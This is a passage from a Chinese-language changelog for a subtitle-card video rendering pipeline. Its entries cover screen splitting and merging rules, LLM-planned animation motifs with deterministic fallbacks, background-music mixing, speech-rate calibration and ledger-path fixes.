🩸 当场撞到：`PLAN_SECTIONS` 声明在 `els` 之后 ⇒ `Cannot access before initialization`；
函数名里放 `⛔` ⇒ `SyntaxError: invalid character`（emoji 不能做标识符）。

测试 1880→1882，全量 1882 passed。

---

## [2.23.0] — 2026-08-20

> 合屏（助理拍板的⑤）：**「决定段边界」纳入编排职责**。
> 🔴 起因是实测推翻了一个假设：**降 speed 救不了短句**——
> X4 在 `speed 0.84` 下仍有 3 处 <3.5s（1.57s / 2.49s / 3.45s），
> **它们是「字少」不是「念太快」**，1.57s 那句再放慢也是短句。

### 三个症状、三个旋钮（与小红书发布线共同钉死）

| 症状 | 唯一有效的旋钮 | ⛔ 无效的 |
|---|---|---|
| 满屏（14 字）停留不够 | `--speed` | gap 加再多也不改屏内时长 |
| **短句**停留不够（字少） | **合屏** | 降 speed 只能改善不能解决 |
| 上句说完抢下句 | `--gap` | — |

### 🔴 拆屏 vs 合屏

| | 是什么 | 归谁 |
|---|---|---|
| **拆屏** | 一句拆成几行 | **确定性闸门**，⛔ LLM 不碰 |
| **合屏** | 相邻短句归一段 | **编排层职责** |

`plan.json` 每句加 `section`；**段首句带 `motif`/`why`/`section_span`，段内其余留空**
（同段共用一个动效＝「段内统一」）。模板新增 `__PLAN_SECTIONS__`，
`sectionOf()` 优先用它、退回每 `SEC_CUES` 句一段（**旧格式 plan 行为不变**）。

### 🩸 三层都要有，缺一层就漏

| 层 | 干什么 | 实测漏在哪 |
|---|---|---|
| ① 输入标注 | 确定性算出「哪些必须合」并在 payload 里标 🔴 | 只给时长让 LLM 自己判 ⇒ **12 句只合 1 处，3 个短句一个没合** |
| ② LLM | 决定**往哪边合**（语义） | 标了 🔴 仍**漏掉 2 个** |
| ③ 确定性兜底 | 它没合的强制并入相邻段 | — |

⚠️ **发现问题归确定性、语义判断归 LLM——执行也要有确定性兜底**：
两件事混在一起时，**它会挑容易的那件做**。

🩸 **兜底首版无脑并进前段**，把一个本已 21s 的段撑到 **23.16s**——
短段消掉了，却制造出「同一动效撑 23 秒」的段，**那正是"编排退化"的另一种形态**。
⇒ 改成**并进合并后更短的那个邻居**。**消一个问题别造另一个。**

### 🩸 两个当场踩到的

- **变量名撞了模块级函数名**：`units = pj.get("screens")` 遮蔽了 `units()`（宽度口径函数）
  ⇒ **有 `--plan` 时正常、没 `--plan` 时 NameError**。⚠️ 只坏一半路径的错最难被发现。
- **段数打印用了兜底前的陈旧值**（`len(head_of)`）⇒ 报「9 段」而实际 8 段。

### ⚠️ `cues.json` 现在带 `params`

`engine/voice/speed/gap/model` 跟着产物走（助理：「八条同参可追溯」）。
⚠️ 参数只留在命令行历史里 ⇒ **一批片子参数不一致也没人发现**，而语速直接决定每屏停留。

测试 1879→1880，全量 1880 passed。

---

## [2.22.0] — 2026-08-19

> 审稿：**编排是真编排（✅），但渲染没兑现设计**——六件 motif 里只有 wipe 明确可辨。

### 🩸 先说量测本身：它量在了「契约要求必须一样」的那一段

审稿量的是**入场后 0.88s** 的文字包围盒，⚠️ **而那时所有入场动画早已结束**
（最长的 depth 也只有 .55s）。那一刻量到的是**停留期**，
而模板硬契约⑤**明确要求停留期完全静止可读**（「观众要读的是字，不是特效」）。

⚠️ **但结论方向仍然是对的**：入场 0.3s、屏却停 6–9s ⇒ 观众 **95% 的时间**看到的确实是同一个静止画面。
⇒ 正解是**拉长可辨窗 + 加大峰值**，⛔ 不是把停留期也动起来。

🩸 **照它给的参数改会把 tilt 改坏**：它建议「tilt 提到 2–3 度」，
而模板里 tilt 的起始角**本来就是 16 度**——它量到 0.3 度是因为量在动画之后。
⇒ **按错误量测给出的参数，会把一个 16 度的动效"提"到 3 度。**
⚠️ **别人给的建议值，要先回去看它是从哪个量测推出来的。**

### 🔴 新量具 `check_motifs.py`：量入场进行中（35% 处）

| motif | 特征指标 | 改前 | 改后 |
|---|---|---|---|
| rise | `dy` 位移 px | 15.5 | **30.7** |
| depth | `blur` px | — | **8.4** |
| drift | `dx` px | — | **29.0** |
| tilt | `rotx` 度 | — | **6.8** |
| wipe | `clip` % | — | **82.8** |
| still | — | 基线 | 基线（四项全 0） |

**判据＝显著高于 `still` 基线**，⛔ 不设绝对阈值（画幅/字号一变绝对值就没意义）。

🩸 **量具自己改过三版，每次都是「指标选错」、⛔ 不是被量对象有问题**：
- `wipe` 用 `clipPath`，**裁剪是视觉的，`getBoundingClientRect` 一点不变**（实测 dw=**0.1px**）；
- `tilt` 的 `dh` 只有 **0.4px**——3D 投影包围盒里透视近端放大与远端缩小互相抵消
  ⇒ 只能**从 `matrix3d` 直接解角度**。

⚠️ **量不出来先怀疑指标选错了，⛔ 别先去改被量的东西**——差一点就把两个本来做对了的动效"加强"了。

### 🔴 六件参数校准

`RISE_P = 72`（段落字卡专用，⛔ 不动 `RISE` 常量——`tpl-oneline` 共用它）／
depth `blur 14→20 / scale 1.05→1.06 / dur .38→.55`／drift `x 74→110`／
入场时长普遍加长（`ENTER` 表同步）／**tilt 角度保持 16°**。

⚠️ **缓动比幅度更能决定"看不看得见"**：`power2.out` 在 35% 处已走完 58%
⇒ 同样 56px 位移观众只看到 ~16px；改 `power1.out` 后同一时刻剩 ~46px（实测 15.5 → 30.7）。

测试 1871→1879，全量 1879 passed。

---

## [2.21.1] — 2026-08-19

### 🔴 编排退化哨兵：「计划 vs 机械轮转」逐段差异率

出片信息里新增一行：

```
🎬 编排 vs 机械轮转：7/11 段不同（64%）
```

⚠️ **差异接近 0 ＝「编排」退化成了轮转——而光看画面分不出来**（片子照样"很丰富"）。
低于 25% 直接在同一行提示。

🔴 **它在模板里算**（`motifFor` 与新抽出的 `rotateFor` 都在那儿），
⛔ **不在 Python 里复刻一份轮转逻辑**——那是「**复刻了原料，复刻不出行为**」。

🩸 这条判据是小红书发布线**三次栽跟头**换来的（2026-08-19 同一天）：
① 自己写切分集 → 漏 `。！？`，误报 9 处；
② 补上句末标点 → 仍漏 `—`(U+2014)，差点让人改两句合法的稿；
③ `from build_oneline import HARD` → **仍过严 6 倍**——`HARD` 只是硬断点字符集，
而 `split_cue` 还有软断点逻辑。
⇒ **要同源，就 import 那个函数本身，⛔ 不是它用的常量。**

测试 1870→1871，全量 1871 passed。

---

## [2.21.0] — 2026-08-19

> X1–X4 语义编排样片开工。本版是跑样片过程中抓到的三处。

### 🔴 否定词不许做上屏结尾（但可做下屏开头）

🩸 **X1 实证**：`好得不像真的` 被切成「…总在好得**不**」｜「像真的」——
读者那一屏读到的是「**好得不**」，⚠️ 自然理解是"好得**不**够"，**与原意正好相反**。

🔴 **判据不是"不成话"，是「截断会让语义翻转」**——这比不成话严重得多：
**不成话读者知道没说完，翻转了读者以为自己读懂了。**

⚠️ **jieba 拦不住**：它把「不像」切成「不」「像」两个词，那**确实**是词边界
（与「持续的｜情绪困扰」同构）⇒ **词边界仍然只是必要条件**（今天第三次）。

⚠️ **有根据的不对称**，⛔ 别按 `STRUCT_PARTICLES` 那样前后都禁：
「不是这样」做下屏开头**完全成话**。

**29 份在产稿：断不开 62→62、软断 147→147（零影响）**，单例验证规则生效。
🩸 中间量错过一次：**拿 15 份 cues.json 的数去比 29 份 txt 的基线**，得出"62→27"的荒谬结论
——⚠️ **加严之后数字下降，本身就该立刻起疑**。

### 🔴 `--plan`：逐段 motif 由视觉计划定，⛔ 不再机械轮转

`tpl-paragraph` 新增 `__PLAN_MOTIFS__`；`build_oneline.py --plan plan.json`（必须配 `--sec-cues 1`）。
⚠️ **这就是「每屏动画由 LLM 按内容设计」落地的那一行**——⛔ 没有它，样片仍是轮转，
而**轮转出来的片子看上去也很"丰富"**，光看画面分不出是不是按内容编排的。

守卫：模板必须是 paragraph／`sec_cues` 必须为 1（否则 motif 挂到错误的段上，
⚠️ **而画面照样出得来，没人会发现**）／单元数必须与 cues 句数相等／motif 必须在闭集内。

### 🔴 `plan_llm.py`：视觉编排的 LLM 入口

编排单元是**「句」（cue）**，⛔ 不是「行屏」——`tpl-paragraph` 硬契约⑥
「段落边界只落在句边界上」。产出后**自动过一次六道闸**，不过就非零退出。

### ⚠️ `HOLD_BAND` 4–6s → 3.5–10s（助理拍板）

**改判据的原因是「前提被否了」，⛔ 不是「嫌它报红」**——这两件事必须分清，
否则每一次报红都能被说成"判据不合适"。
4–6s 建立在「可以在句内按语义切分」的假设上，而契约⑥把这个假设否了。
⚠️ **放宽的是 warn 的范围，⛔ 不是 fail 的门槛**（下限仍 3.5s 且照旧 fail）。

测试 1868→1870，全量 1870 passed。

---

## [2.20.0] — 2026-08-19

> 秘书问 X1–X4 语义编排进度 ⇒ 先做它的地基「用真 cues 重算 4–6s 那组数」，
> **当场发现全线用的语速口径是错的**。

### 🔴 语速真值：句内 4.23，⛔ 不是 3.5

**15 份在产稿、401 句、8177 汉字、1933.8s 实测**：

| 口径 | 值 | 算法 | 用途 |
|---|---|---|---|
| **句内** | **4.23** | `Σ(句 end−start) ÷ Σ字数` | **「这一屏停多久」** |
| 整片 | 3.88 | `(末句 end − 首句 start) ÷ Σ字数` | 「成片多长」 |

两者之差＝**句间静音，合计 8.2%**。

🩸 **原来的 3.5 是双重错配**：
1. **口径错**——那是**整片**口径，却被拿去算「每屏停多久」；
2. **样本是异常值**——出自单条 `oneline-qiuqiu-jianyao`，**它的句间静音 16.3% 是 15 条之最**（其余 6–8%）。

⇒ 3.5 比真值低 17% ⇒ **每屏停留被高估 21%**：实际只停 3.5s 的屏被算成 4.2s ⇒ **`check_collage_script` 一直在漏报**。

⚠️ **一条样本 + 错口径，出来的数看着很像真值**（它确实是"实测"来的）——**这种数最难被怀疑**。
⛔ 别再拿单条片子定全线的尺子。

按 4.23 折算：`HOLD_MIN 3.5s` ≈ **15 字**｜`4–6s` ≈ **17–25 字**（按 3.5 算是 14–21 字，**偏少 3–4 字**）｜印章屏 `4.5s` ≈ **19 字**。

`check_plan.py` 的 `HOLD_BAND` 标注同步从「估算值，拿到真 cues 后重算」改成已量过的真值。
新增测试**可复算**语速（⛔ 不是"某人某次量的"）。

测试 1866→1868，全量 1868 passed。

---

## [2.19.2] — 2026-08-19

> v2.19.1 实战跑了一条，登记逻辑生效了，但**台账路径算错了**（小红书发布线报）。

### 🔴 台账推导：先找**已存在**的那一份

🩸 `--fix-cover --job 350 --cover <封面>` 是补封面的**典型用法**（手上只有 job 号和封面，
没理由再带 `--note`）。旧实现「第一个非空候选就 return」⇒ 落到封面的父目录 `cover-brand7/`，
真台账却在稿件目录 `seven/` ⇒ 补救号登记不进发布那一行 ⇒ **recheck 永远闭不掉**。

⚠️ **SKILL.md 当时已经警告过这个坑**（「`--ledger` 必给」），照样踩。
⇒ **要求人每次多带一个参数才不出错的规矩，人一定会漏**——修推导链，⛔ 不是再加一句提醒。

🩸 **第一版我改错了方向**：直接把 `--cover` 从链里摘掉，**当场打断 5 个用例**——
轮播/放映线的封面**就在媒体目录里**（`cover-1.jpg` 与稿件同级）。
⇒ **两种用法都真实存在，区别不在"是哪个参数"，在"那里到底有没有台账"。**
⚠️ 别人点名一处，得先数清这个共用函数还有谁在用。

⇒ 最终实现：**按顺序找第一个已存在的台账**（含 cwd 锚点）；一份都没有时返回第一个候选，
用来把错误信息**指到最可能的位置**。⭕ 「绝不新建」这条不变——它正是这次没造成更大伤害的原因
（没在 `cover-brand7/` 里造一份假台账）。

### ⚠️ 发布 → 补封面之间必须夹一次台账同步（100% 必经）

🩸 job 349、350 **连续两次都撞**：发布刚落地时台账里还没有平台 `note_id`，而补封面要它定位笔记。
xhs-server 给的节奏文档漏了这一步。

- SKILL.md 视频线补进**①.5 同步台账**（`note_ops.py --sync-ledger <账号>`，幂等可重试）
- 报错改成**可直接粘贴的完整命令**（账号 id 从 job 回执里取，⛔ 不留 `<账号>` 让人猜）
- ⚠️ **⛔ 没做成"自动跑一次 sync"**：`--fix-cover` 的语义是补封面，顺手改台账文件是另一个动作；
  而且 note_ops 也要推台账路径——**在一个刚修完路径推导 bug 的地方再叠一层推导，风险大于省下的那一步**。

测试 1862→1866（含「封面与台账同目录时仍然认 cover」与「一份都不存在时指向最可能的位置」
两条反向用例，⛔ 防再往单一场景改坏），全量 1866 passed。

---

## [2.19.1] — 2026-08-19

> 小红书发布线转 xhs-server 的定位：`--fix-cover` **台账登记时机**在咪问首发上实炸一次，
> 而接下来 11 次补封面每次都可能重演。

### 🔴 入队即登记，⛔ 不等轮询拿到终态

🩸 **事故形状**：轮询中吃了一个 Cloudflare **502**，脚本报 `outcome: failed`——
而只读复查 `GET /api/note-components/<cjob>` 是 **`status:done` / `applied.cover:true`**，
**任务其实成功了，502 只断了轮询**。

🔴 **真伤是次生的**：登记没做 ⇒ 台账那一行不知道该读哪个 component job
⇒ `--recheck` 只能读发布 job 的原始回执（`cover=error`）⇒ **台账永远闭不掉**，
`--ledger-check` 一直 `open_count=1`，而**不看脚本源码的人根本不知道要手工补索引**。

🔴 **根因是把两件事绑在一起**：「**登记去哪读**」与「**读到了什么**」。
前者在**入队瞬间就已确定**（server 回执里就有 `job_id`），后者要等轮询——
**绑在一起，网关一抖就把前者陪葬**。

⇒ 拆开：**入队即写索引**（`remedies[comp] = str(cjob)` 是覆盖式赋值 ⇒ **重复写同值天然幂等**），
**终态判定仍然只由 `--recheck` 回 server 读** ⇒ ⛔ 不会造成假闭环。

### ⚠️ 轮询断了 ≠ 任务失败：⛔ 别裸抛

裸抛会把已经拿到的 `cjob` **埋进 traceback**，人得翻栈才知道该复查哪个号。
⇒ 改成输出 `outcome: unknown` + `component_job_id` + `ledger_remedy` + 处置指引（退出码 2）：

```
⚠️ 轮询断了，**任务多半仍在服务端跑完了**——⛔ 绝不重跑 --fix-cover（每次重跑都是一次真提交）。
   只读复查：GET /api/note-components/<cjob> 看 applied.cover 是不是 true；
   台账索引**已在入队时写好**，直接 --recheck <发布任务号> 闭环
```

测试 1859→1862（含一条「登记时机必须在入队之后、轮询之前」的源码位置断言，⛔ 防挪回去），
全量 1862 passed。

---

## [2.19.0] — 2026-08-19

> 助理拍板：账号图标位**跟落款走同一机制**（只首屏与落款屏浮出、中间屏不出现），
> 收进真源做成**按账号可选的配置**（默认关）。⛔ 不做常驻，不碰契约③。

- **`--account-icon <图片>`**：图片内联成 data URI（零外部依赖，⛔ 免得工作目录少拷一个文件就静默丢图）。
- 形态**照搬博客长文 2026-08-19 已过审的那版**（`bottom:206px` / 首屏 200px / 落款屏 ×0.6），⛔ 没凭观感重调——审过的是那个形态。
- 🔴 **DOM 放在 `#stage` 之前**（同 z-index 下**先绘者在下** ⇒ 图标在字层之下）。🩸 别处那版放在 `#stage` 之后、却注释成「z-index 低于字层」——**那是错话**，它让后人以为有层次保护，而实际"不挡字"只靠**位置分离**。
- **位置分离算得出来**（按最坏情况＝专名屏两行）：3:4 间隙 **211px**、16:9 **69px**，已写成测试。
- ⚠️ **16:9 的 `icon_bottom`/`icon_px` 是等比推算的，⛔ 没有目视验证过**——第一次在 16:9 用之前先渲一条看。⛔ 别把这句注释删掉当它验过了。
- **两种状态都打**：`账号图标位：<路径>` / `⛔ 无账号图标位`。

**Playwright 实测**（10.91s 片、每 0.1s 采 opacity）：可见区间 `0.20–2.40s`（首屏 0.00–2.41s）
与 `9.20–10.90s`（落款屏），**中间屏区间内可见采样点 0 个**。

🩸 **`%` 格式化当场炸了一次**：CSS 里 `%` 太多（`left:50%`、`translateX(-50%)`、
`transform-origin:50% 100%`），用 `%` 格式化就得逐个转义成 `%%`，**漏一个就是运行时 ValueError**，
报的还是「unsupported format character」这种跟真因无关的话。⇒ 改用 `@X@` 占位 + 漏填自检。

测试 1853→1859，全量 1859 passed。

---

## [2.18.1] — 2026-08-19

> 审稿代理审 12 条加 BGM 的成片，两笔。

### 🔴 成品必须自报有没有背景音

🩸 v2.18.0 把 BGM 默认改成开 ⇒ **整片渲染出的 mp4 就带 BGM 了**，与下游
「out＝纯净底版／out-bgm＝带 BGM」的约定撞车（kepu-B 上抓到）。

⚠️ **改默认值时光写 CHANGELOG 不够**——**波及的是所有既有调用方的产物内容，而它们不知道**。
⇒ 让**每一次产出自己说清它是什么**，两种状态都打：

```
✅ out.mp4 28.6MB (-15.99 LUFS / -4.41 dBTP)｜背景音 auto（压 14 LU）
✅ out.mp4 28.3MB (-15.98 LUFS / -3.80 dBTP)｜⛔ 无背景音
```

**默认仍然保持开**——关掉的话明天新渲的片子又没有背景音，**同一个投诉第三次**。

⚠️ **「纯净底版」不需要一个 mp4 来承载**：**它就是 `narration.mp3.wav`**，`remux()` 正是从它
出发重混的（显式拒绝拿成片音轨当口播）。⇒ **新渲的片子⛔ 不用再 remux**，再跑一遍只是白多一次 AAC 编码。

### 🔴 短屏护栏：入场时长按屏长收缩，退场起点夹住

🩸 **起因是别的产线先撞上的**：博客长文的账号图标位淡入 `.15+.7`、淡出 `end−.25` 全写死秒数
⇒ 首屏 0.88s 时**淡出起点比淡入终点还早 0.22s**，没有平台期，图标一闪。

⚠️ **同一个缺陷在 tpl-oneline 里是"还没触发"的状态**——29 份在产稿 1067 屏里最短 0.347s，
按原参数平台期只剩 **0.087s**。⇒ 别人点名的是他那处，**我这处是同一类**。

```js
const inDur = s => Math.min(IN, Math.max(0.08, (s.end - s.start) * 0.4));
// 退场绝不早于入场结束
Math.max(at(s.end - LEAD), t0 + din)
```

🔴 **屏长 ≥0.65s 时 `dur*0.4 ≥ 0.26` ⇒ 与改动前逐帧相同**——⛔ 这次改动不许动到任何一条
已过审片子的动效。**Playwright 实测（92 个时刻 × 3 屏，读 opacity+transform）**：
2.000s 屏差异 **0**｜2.153s 屏差异 **0**｜0.347s 短屏差异 12（正是意图）。

测试 1849→1853，全量 1853 passed。

---

## [2.18.0] — 2026-08-18

> 老板 22:40 看 X6 12 条成片：**「都没有背景音，需要添加」**。

### 🩸 根因不是"没做过 BGM"，是**只有字卡线漏接了**

轮播线（`slideshow_video`）与微电影线（`compose_video`）**一直有** BGM，`BGM_DUCK_LU=14`
还是老板 **2026-08-16** 对着成片实听调下来的。⚠️ 这是 `BGM_DUCK_LU` 注释里那条教训的
**第二次现身**：**「修复只落在他点名的那个形态上」** ⇒ 同一个老板在另一个形态上又听到一次同样的问题。

⇒ 本次**直接复用 `audio_master.prepare_bgm`**，⛔ 不为字卡线另写一套混音——三条线必须同一个声音。
⚠️ **⛔ 没加 sidechain**（原需求提过）：三条线都是静态压 14 LU，字卡线单独上就是**三条线三个声音**。

### 曲库：本仓 2026-08-16 已拍过，⛔ 不重新发明

`--bgm auto` ＝ `gen_bgm.py` **纯合成**，零版权零外部素材。
🔴 **⛔ 不下载来路不明的音乐**：**一条商用短视频背一首侵权 BGM，赔的钱比整条产线省的多**。
⛔ **也不用 CC BY**——署名要求意味着每条片子片尾都得加一行字幕，破坏本版式的硬契约。

### 新增 `--remux 源.mp4 输出.mp4`

对**已成片**重混，⛔ 不重渲帧（那批帧渲完即清，重渲 12 条要 70 分钟，重混 41 秒/条）。
⚠️ 与 `--mux-only` 不是一回事（那个从**帧目录**收口），⛔ 没改它的语义。
🩸 参数**不借位置参数**：借了的话 `--remux a.mp4 b.mp4` 会把 b.mp4 当成 html，
报出来的却是「需要 out 参数」——**把用法错说成缺参数**。

### 🩸 两个当场踩到的

- **ffmpeg 输入段混进了编码选项**：`-i a.mp4 -c:v copy -i b.wav` 里的 `-c:v copy` 被当成 **b.wav 的输入选项** ⇒ exit 8。⚠️ 而 `capture_output=True` **把真正的原因吞了**，看到的只有「returned non-zero exit status 8」。⇒ 加 `_run_ffmpeg()` 失败时报 stderr 尾巴。
- **量具自己被静音**：`ffmpeg -v error … volumedetect` 里 `-v error` 把 volumedetect 的 info 级输出也压掉了 ⇒ 量了半天全是空。**先验量具，再验对象。**

### 🔴 「BGM 在」与「BGM 听得见」是两件事

压 14 LU 后混合总能量只增加 `10·log₁₀(1+10^(−14/10)) = 0.17 dB` ⇒ **有人声时几乎量不出来**（实测 0.1 dB）。
⚠️ 验 BGM **要量句间静音段**，⛔ 量整片或人声段会得出「BGM 没进去」的错结论。

**冒烟（kepu-a 成片 209.7s）**：片长 209.733333s **完全不变**｜视频流 md5 **完全一致**｜
句间静音 @95.9s **−91.0 → −31.7 dB**｜人声段 −18.4 → −18.3 dB｜末屏 12356 段 −17.9 → −17.8 dB｜
母带 **−15.99 LUFS / −4.41 dBTP**｜**41s**（重渲要 ~11 min）。

测试 1844→1849，全量 1849 passed。

---

## [2.17.0] — 2026-08-18

> 助理：8 条重渲复测全过（TAIL／专名／12356 全好，真劈词 73→3），观察到问题平移成
> 「断在名词短语中间」。查下来**真正在出事的是另一件**：单字黑名单在制造假红。

### 🔴 结构虚词判的是「词」，⛔ 不是「字」

🩸 `向` 在 `STRUCT_PARTICLES` 里 ⇒ 助理举的 kepu-a 那句「证据**方向**｜是相反的」被当成
"断在介词后"**整句拒渲染**——**逼作者改一句本来没问题的话**。

⚠️ **同一个字在不同词里角色不同**：「方向」的「向」是名词的一部分，**单字黑名单永远分不出这两种**。
⇒ 升到词级：`jieba` 把「方向」切成一个词 ≠「向」⇒ 放行；「持续/的」「挡/在/门外」里那些虚词
**本来就是独立的词** ⇒ 照禁。**拦截能力一点没少，误伤面大幅缩小**（29 份在产稿：断不开 63→62）。

⚠️ jieba 不可用时**退回单字判据**（更严、多拒），⛔ 不是悄悄放行。

### ⚠️ 「三字孤悬」：报出来，⛔ 别靠提高 MIN_SOFT 治（数据不支持）

| | 断不开 | 软断 | ≤3 字屏 |
|---|---|---|---|
| `MIN_SOFT=3`（现行） | 62 | 147 | **122** |
| `MIN_SOFT=4` | **77**（+24%） | 132 | **107**（−15） |

🔴 **≤3 字屏 122 个，提高 MIN_SOFT 只消掉 15 个（12%）**——**大头根本不来自软断，来自作者
自己用逗号句号断出来的短句**，而 `MIN_SOFT` 只管软断。代价与收益完全不成比例。
⇒ 给短屏独立记号 `[短屏]`（能数能 grep），**报出来让作者调标点**。
🩸 光有 `MIN_SEC` 时长警告不够——它跟软断警告混在一堆 `⚠️` 里，**warn 太弱、人不会逐条看**。
⚠️ 短屏是**报**不是**拒**：「够了」「不是的」这种三字屏是刻意的节奏。

### 🩸 「有 fail 就早退」又吃掉了两类

上一版把专名屏挪到早退之前，**软断与短屏还留在后面** ⇒ 有 fail 的稿子照旧看不到它们，
而预检是四类一次报全的。⚠️ 「有 fail 就早退」看着很合理（反正不出片了），但它让
**同一份稿子在两个工具里显示的问题数量不一样**——人会以为修完 fail 就没别的事了。
⇒ 四类（`[断不开]`／`[软断]`／`[专名屏]`／`[短屏]`）全部在早退之前报，同源测试四类逐一比对。

### 🔴 已知缺口（⛔ 别以为这版解决了）

助理提的正向判据「每屏必须能独立成话」，**只落地了可计算的那部分**。
⛔ **「断在名词短语中间」没有落地**——它要句法分析，`jieba` 的分词+词性给不出短语边界。
`目前这个领域的证据方向｜是相反的` 现在是**合法断点**，割不割裂归写稿人裁决。

测试 1837→1844，全量 1844 passed。

---

## [2.16.1] — 2026-08-18

> 助理拍板：专名屏做**浏览器端 refit**（按实测宽度回收估算余量），下限保持 60%，⛔ 不提门槛去逼改稿。

- **`refitProper()`**：按实测宽度把专名屏字号往上抬。🔴 **只放大**（缩小是 Python 那侧的裁决，含 60% 下限判定，⛔ 这里不重做）；🔴 **封顶＝整片字号**（专名屏最好看的结果就是"跟别的屏一样大"）；留 1% 余量防度量非线性，**试过才算数**（放大后重量一次，超了退回）。

  | 估算 | refit 后 | 比例 |
  |---|---|---|
  | 57px | **62px** | 77% → **84%** |
  | 58px | **66px** | 78% → **89%** |
  | 53px | **63px** | 72% → **85%** |

- ⚠️ **refit 必须跑在 `window.SEEK` 挂出去之前**——渲染器只等 SEEK，**根本不知道页面还在变**；跑晚了第一批帧就是 refit 前的字号，**而且没有任何东西会报错**。已用测试钉住先后顺序。
- ⚠️ **refit 与 report 分开写**：一个是改、一个是量。**量具和被量对象混在一起，量出来的永远是自己想要的数**。测试断言 `report()` 体内不出现 `style.fontSize`。
- **Python 端打印改成「估算 ≥Npx，实际见像素闸」**——⚠️ 两个数印在同一份输出里，人会当成同一个数（实测普遍高 8–15%）。

⚠️ **残余的保守没有一起放宽**：`proper_lines()` 的 `limit` 仍按估算算，所以少数 refit 后其实能过的句子会在 build 阶段就被拒。**这是有意留的**——放宽它等于让 `--precheck`（离线、开不了浏览器）说能过、真跑却被像素闸拒，**预检与真闸当场不同源**。⇒ 宁可多拒（代价：作者多断一句，且报得清楚），⛔ 不要假绿。

测试 1833→1837，全量 1837 passed。

---

## [2.16.0] — 2026-08-18

> 助理：本批 5 条科普的 `12356` 没被劈是**侥幸**（恰好写成「热线，12356」让号码单独成屏），
> v2.14.0 之前不带逗号会全劈。⇒ 把不可分割规则**扩到整类数量串**。

- 🔴 **含数字串**（手机号／身份证／PMID／DOI `10.1001/jama.2024.1234`／百分比 `35.5%`／区间）
- 🔴 **中文数量串**（`二〇二六年八月`／`四百到六百元`／`三分零五秒`）
- 🩸 **数字内部的 `.` `:` `/` 不当句读**——**这是个在产的坑**：`HARD` 里就有 `.` `:`，硬切根本轮不到保护区间，`display()` 还会把点整个丢掉 ⇒ `10.1001` → `101001`（**DOI 被改了**）、「下降了 3.2 个百分点」→「下降了 3」「2 个百分点」（**数值变了**）。⚠️ 只保护**数字参与**的那一侧，`e.g.` 照旧当句读。
- **软断片段 strip**：切点落在空格旁时片段带首尾空格，屏上是一块歪掉的留白。

**判据是「切开后数值就变了」，⛔ 不是"读着别扭"**——「二〇二」「六年八月」是**一个不存在的日期**。

⚠️ **误伤面有意压小**：只保护 ≥2 字的串（「不一样」的「一」不算），连接词只收「到/至/多/余」⛔ 不收「和/或」。

**29 份在产稿实测：断不开 63→63、软断 146→146、屏数 1971→1971，逐文件零差异。**
同批被新规则保护住的串 **425 处** ⇒ 零变化**不是规则没生效**，是这些串本来就没被切。
⚠️ 但这批稿里目标场景（热线/日期/金额）样本极少 ⇒ **它对"会不会引发假红"只是弱证据**。

测试 1821→1833，全量 1833 passed。

---

## [2.15.0] — 2026-08-18

> 助理两次拍板：① 刊名走进「不可分割＋不缩字号＋装不下」的死结 ⇒ **开专名屏例外**；
> ② 本轮 53 处软断里发现结构虚词规则**只挡住半边** ⇒ **改成前后对称**。

### 🔴 专名屏例外（"绝不折行"的唯一例外）

一屏含**不可分割英文专名**且装不下时，允许**两行排版** + 只缩**这一屏**的字号（下限 60%）。

- 🔴 **触发条件是「含不可分割专名」，⛔ 不是「装不下」。**这条区别就是它没有废掉版式的原因：若由"装不下"触发，**任何长句都能触发**，硬契约当场失效；由"含专名"触发，触发集是**封闭可枚举的**。
- 🔴 **两行同屏可以、两屏分时不可以**：分**屏**＝时间上分离 ⇒ 第 2 屏单看是「and Psychosomatics」，**一个不存在的刊名**；分**行**＝空间同时可见 ⇒ 一眼看到完整刊名。
- 🔴 **折点算死后下发，⛔ 绝不开 CSS 自动折行**：专名里有空格，浏览器会折在 `Psychotherapy` 后面——**所有折法里最坏的一个**。⚠️ 自动折行看着"能用"，出的正是要禁的那一屏。
- **预检报 info ⛔ 不是 warn**——它是**已处理好**的状态。⚠️ 报成 warn 会让人跑来"修"一个没坏的东西。
- 🩸 **首版写岔过**：两条守卫互相打架（一条要求折点前是空格、另一条禁止折点贴空格）⇒ **唯一合法的折法被排除**，实际出的是「Psychotherapy a ／ nd Psychosomatics」。⚠️ **是测试断言当场把它逼出来的**——⛔ 别把"专名完整"这条断言删了。
- 实测（真开 Chromium）：57px（整片 74px 的 77%），实测 896px ≤ 安全区 1000px。

### 🔴 结构虚词前后对称

`STRUCT_PARTICLES` 一张表两侧生效（`TAIL_BAN is HEAD_BAN`）。

🩸 **昨天只禁了"不许做上屏结尾"，本轮 53 处软断里这三处照出不误**——**判据只看了断口的左边**：
「第一作者是我们｜**的**咨询师负责人李牧阳」「把想来的人挡｜**在**门外」「正念更关心你｜**和**自己感受之间的距离」。

⚠️ 根子在**两张登记表对同一批字给了相反的裁决**：`TAIL_BAN` 说「不许做结尾」，`SOFT_HEAD` 却把「在/和/把/被…」列为**合法开头**——**代码先读哪张就听哪张**。⇒ 合成一张表。

### 🔴 顺带抓到的两处（同一条规则的自然延伸）

- **数字串不可分割**：`请打 12356` 劈成「请打 123」「56」＝**给出一个错的危机热线号码**。⚠️ 刊名说错是学术不严谨，**热线说错是有人打不通**。
- **建议断点本身必须合法**：闸门拒了那句危机声明，给的三条建议是「情绪困｜扰」「持续的情绪｜困扰」——**全都切在词中间或虚词后**，正是同一天刚立规矩要禁的两种。⚠️ 闸门报红是对的，但**处置建议会把人引到一个新的错**——一个把人引向错误修法的报错，比不报还糟。⇒ 建议过同一道 `soft_ok`；挑不出就**明说"请改写成两句"**，⛔ 不硬凑三条。

### 🩸 闸门自己的假红：同源测试差点被改坏

`test_预检与真闸必须同源` 在专名屏例外上线后报「真闸 0 处 vs 预检 1 处」。**两个原因叠在一起**：

1. **样本只覆盖了一种终态**——它选的正是刊名那句，例外把它接走后就没有 fail 了；
2. **fail 与软断共用「· 第」这一个记号** ⇒ 计数互相串味。⚠️ 原样本恰好一处软断都没有，**所以这个坑一直没露头**。

⇒ 三类结果各给各的记号（`[断不开]`／`[软断]`／`[专名屏]`），**三类逐一比对**。
⇒ 顺带发现真闸**有 fail 就早退、不打印专名屏**，而预检三类一次报全——**两边看到的东西不一样，「同源」就只剩一句口号**。已把专名屏挪到早退之前。

测试 1807→1821，全量 1821 passed。

---

## [2.14.0] — 2026-08-18

> 审稿代理审 12 条 oneline 成片实证（同步/文本一致/人名不劈/12356 单屏 **12/12 合格**，但下列四处必须修，**今晚不发、明早重渲**）。

- 🔴 **断句器补三条硬否决**——⚠️ **昨天加的 jieba 词边界不够**：
